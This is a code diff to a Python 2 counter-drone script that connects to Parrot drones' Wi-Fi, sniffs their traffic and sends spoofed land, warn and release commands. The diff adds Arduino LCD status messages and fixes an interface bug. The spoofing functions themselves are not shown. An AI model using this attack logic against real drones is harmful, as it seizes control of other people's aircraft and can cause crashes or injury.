@@ -4,8 +4,8 @@ import threading
 from evolo import *
 
 #global constants
-interfaceForScan = "wlan0"
-interfaceToConnect = "wlan1"
+interfaceForScan = "wlan1"
+interfaceToConnect = "wlan0"
 
 ############################
 #Process for normal attacks#
@@ -13,9 +13,11 @@ interfaceToConnect = "wlan1"
 def attack(parrotsAP):
 	global attackInProgress, underattack
 	print "Attack started"
+	arduinoLCD("Attack started")
 	
 	if not connectTo(parrotsAP, interfaceToConnect):
 		print "Could not connect to parrot at", parrotsAP.ssid, ", exiting"
+		arduinoLCD("Can't connect " + parrotsAP.ssid)
 		underattack = []
 		attackInProgress = 0
 		return
@@ -26,6 +28,7 @@ def attack(parrotsAP):
 	wifiDistance = getWifiDistance(interfaceToConnect, parrotsAP)
 	
 	print "Succesfully connected to", parrotsAP.ssid
+	arduinoLCD("Connected to " + parrotsAP.ssid)
 	
 	srcMAC, dstMAC, srcIP, dstIP, segNr = sniffParrotCommunication(interfaceToConnect)
 	
@@ -34,46 +37,57 @@ def attack(parrotsAP):
 	
 	if srcMAC != "": #only attack if sniffing was successfull. Otherwise simply quit
 		if mode == "Aggressive":
+			arduinoLCD("Sending land commands")
 			sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10) #send 10 land packet
 		elif mode == "Moderate":
+			arduinoLCD("Sending warn commands")
 			sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 			print "Wait for 5 seconds"
+			arduinoLCD("Wait 5 sec")
 			sleep(5) #original idea was 10 here, I changed it to 5 for debugging
 			print "Wait ended"
 			if attackInProgress == 2: #if panic mode started, quit
 				return
 			print "Send release packet"
+			arduinoLCD("Sending release command")
 			sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
-			print "Wait 5 seconds"
+			print "Wait for 5 seconds"
+
 			sleep(5)
 			print "Wait ended"
 			if attackInProgress == 2: #if panic mode started, quit
 				return
 			print "If still here, land it"
 			if getWifiDistance(interfaceToConnect, parrotsAP) > 0: #if the drone is still in wifi range land it
+				arduinoLCD("Sending land commands")
 				sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 		elif mode == "Gracious":
-			while getWifiDistance(interface, parrotsAP) > 0: #while the drone is in wifi range
+			while getWifiDistance(interfaceToConnect, parrotsAP) > 0: #while the drone is in wifi range
 				if wifiDistance * 1.1 > getWifiDistance(interfaceToConnect, parrotsAP): #if it is coming closer, land it
+					arduinoLCD("Sending land commands")
 					sendSpoofedParrotPacket("land", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 				else: #otherwise warn again
+					arduinoLCD("Sending warn commands")
 					sendSpoofedParrotPacket("warn", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, segNr, 10)
 					sleep(10)
 					
 					if attackInProgress == 2: #if panic mode started, quit
 						return
 					
+					arduinoLCD("Sending release command")
 					sendSpoofedParrotPacket("release", interfaceToConnect, srcMAC, dstMAC, srcIP, dstIP, 1, 1)
 					sleep(5)
 					if attackInProgress == 2: #if panic mode started, quit
 						return
 	else:
 		print "No communication toward parrot at ", parrotsAP.ssid, ", exiting"
+		arduinoLCD("No com to " + parrotsAP.ssid)
 	#if attack finished, clean up the global variables
 	underattack = []
 	attackInProgress = 0
 	disconnectFromWifi(interfaceToConnect)
 	print "Attack finished"
+	arduinoLCD("Attack finished")
 
 ##########################################
 #Panic mode if multiple drones are coming#
@@ -96,10 +110,13 @@ def panicMode():
 #####################
 if __name__ == '__main__':
 	print "Evolo has started"
+	startArduino()
+	arduinoLCD("Evolo started")
 	disconnectFromWifi(interfaceForScan)
 	disconnectFromWifi(interfaceToConnect)
 	sleep(5)
 	print "Evolo is ready for operation"
+	arduinoLCD("Evolo is ready")
 	global mode, Range, underattack, attackInProgress, attackT
 	underattack = []
 	attackInProgress = 0 #0 - no attack, 1 - normal attack, 2 - panic mode
